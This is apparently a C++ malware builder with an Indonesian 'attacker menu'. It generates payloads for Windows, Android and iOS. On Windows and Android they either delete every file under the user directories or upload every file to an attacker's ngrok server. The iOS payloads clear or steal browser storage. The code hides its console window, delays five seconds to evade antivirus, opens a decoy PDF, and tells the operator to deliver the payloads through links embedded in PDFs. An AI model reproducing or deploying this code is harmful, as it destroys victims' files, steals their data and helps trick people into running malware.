#include <iostream>
#include <fstream>
#include <string>

void generateDeletePayloadWindows() {
    std::ofstream out("delete_payload_win.cpp");
    out << R"(
#include <iostream>
#include <filesystem>
#include <windows.h>

namespace fs = std::filesystem;

void deleteAllFiles() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::string path = "C:\\Users\\";
    try {
        for (const auto& entry : fs::recursive_directory_iterator(path)) {
            if (fs::is_regular_file(entry)) {
                fs::remove(entry);
            }
        }
    } catch (const fs::filesystem_error& e) {}
}

int main() {
    Sleep(5000);
    deleteAllFiles();
    system("start dummy.pdf");
    return 0;
}
)";
    out.close();
    system("g++ delete_payload_win.cpp -o delete_payload_win.exe -static");
    std::cout << "Payload hapus file (Windows) dibuat: delete_payload_win.exe\n";
}

void generateSharePayloadWindows() {
    std::ofstream out("share_payload_win.cpp");
    out << R"(
#include <iostream>
#include <filesystem>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>
#include <windows.h>

#pragma comment(lib, "Ws2_32.lib")
namespace fs = std::filesystem;

void sendFileToServer(const std::string& file_path, const std::string& server_url) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    inet_pton(AF_INET, "YOUR_NGROK_IP", &server.sin_addr);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) != SOCKET_ERROR) {
        std::ifstream file(file_path, std::ios::binary);
        if (file.is_open()) {
            std::string file_content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            file.close();

            std::string request = "POST /upload HTTP/1.1\r\n"
                                 "Host: YOUR_NGROK_URL\r\n"
                                 "Content-Type: application/octet-stream\r\n"
                                 "Content-Length: " + std::to_string(file_content.length()) + "\r\n"
                                 "File-Name: " + file_path + "\r\n\r\n" + file_content;
            send(sock, request.c_str(), request.length(), 0);
        }
        closesocket(sock);
    }
    WSACleanup();
}

void shareAllFiles() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::string path = "C:\\Users\\";
    try {
        for (const auto& entry : fs::recursive_directory_iterator(path)) {
            if (fs::is_regular_file(entry)) {
                sendFileToServer(entry.path().string(), "YOUR_NGROK_URL");
            }
        }
    } catch (const fs::filesystem_error& e) {}
}

int main() {
    Sleep(5000);
    shareAllFiles();
    system("start dummy.pdf");
    return 0;
}
)";
    out.close();
    system("g++ share_payload_win.cpp -o share_payload_win.exe -static -lws2_32");
    std::cout << "Payload kirim file (Windows) dibuat: share_payload_win.exe\n";
}

void generateDeletePayloadAndroid() {
    std::ofstream out("MainActivity.kt");
    out << R"(
package com.example.malware

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import java.io.File

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Thread.sleep(5000) // Delay untuk bypass AV
        deleteAllFiles()
        finish()
    }

    private fun deleteAllFiles() {
        val path = "/storage/emulated/0/"
        val dir = File(path)
        if (dir.exists()) {
            dir.walk().forEach { file ->
                if (file.isFile) {
                    file.delete()
                }
            }
        }
    }
}
)";
    out.close();
    std::cout << "Payload hapus file (Android) dibuat: MainActivity.kt\n";
    std::cout << "Build ke APK menggunakan Android Studio, lalu embed tautan di PDF.\n";
}

void generateSharePayloadAndroid() {
    std::ofstream out("MainActivity.kt");
    out << R"(
package com.example.malware

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.nio.file.Files

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Thread.sleep(5000)
        shareAllFiles()
        finish()
    }

    private fun shareAllFiles() {
        val path = "/storage/emulated/0/"
        val dir = File(path)
        if (dir.exists()) {
            dir.walk().forEach { file ->
                if (file.isFile) {
                    Thread {
                        sendFileToServer(file)
                    }.start()
                }
            }
        }
    }

    private fun sendFileToServer(file: File) {
        try {
            val url = URL("http://YOUR_NGROK_URL/upload")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/octet-stream")
            conn.setRequestProperty("File-Name", file.name)
            conn.doOutput = true

            val fileContent = Files.readAllBytes(file.toPath())
            conn.outputStream.write(fileContent)
            conn.outputStream.close()

            conn.responseCode // Trigger request
            conn.disconnect()
        } catch (e: Exception) {}
    }
}
)";
    out.close();
    std::cout << "Payload kirim file (Android) dibuat: MainActivity.kt\n";
    std::cout << "Build ke APK menggunakan Android Studio, lalu embed tautan di PDF.\n";
}

void generateDeletePayloadIOS() {
    std::ofstream out("exploit.js");
    out << R"(
setTimeout(function() {
    // Hapus file di direktori yang diizinkan (terbatas karena sandbox iOS)
    alert("Malware dijalankan: Menghapus data...");
    // iOS tidak izinkan akses file langsung, jadi simulasi penghapusan data aplikasi
    localStorage.clear();
    sessionStorage.clear();
}, 5000);
)";
    out.close();
    std::cout << "Payload hapus file (iOS) dibuat: exploit.js\n";
    std::cout << "Host di server web dan embed tautan di PDF.\n";
}

void generateSharePayloadIOS() {
    std::ofstream out("exploit.js");
    out << R"(
setTimeout(function() {
    // Kumpulkan data terbatas (karena sandbox iOS)
    var data = {
        device: navigator.userAgent,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://YOUR_NGROK_URL/upload", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.setRequestHeader("File-Name", "ios_data.json");
    xhr.send(JSON.stringify(data));
}, 5000);
)";
    out.close();
    std::cout << "Payload kirim file (iOS) dibuat: exploit.js\n";
    std::cout << "Host di server web dan embed tautan di PDF.\n";
}

int main() {
    int choice, platform;
    std::cout << "Menu Penyerang:\n";
    std::cout << "1. Hapus semua file\n";
    std::cout << "2. Kirim semua file ke server\n";
    std::cout << "Pilih opsi (1/2): ";
    std::cin >> choice;
    std::cout << "Pilih platform (1: Windows, 2: Android, 3: iOS): ";
    std::cin >> platform;

    if (choice == 1) {
        if (platform == 1) generateDeletePayloadWindows();
        else if (platform == 2) generateDeletePayloadAndroid();
        else if (platform == 3) generateDeletePayloadIOS();
    } else if (choice == 2) {
        if (platform == 1) generateSharePayloadWindows();
        else if (platform == 2) generateSharePayloadAndroid();
        else if (platform == 3) generateSharePayloadIOS();
    } else {
        std::cout << "Pilihan tidak valid.\n";
        return 1;
    }
    std::cout << "Embed payload ke PDF atau host tautan di PDF.\n";
    return 0;
}
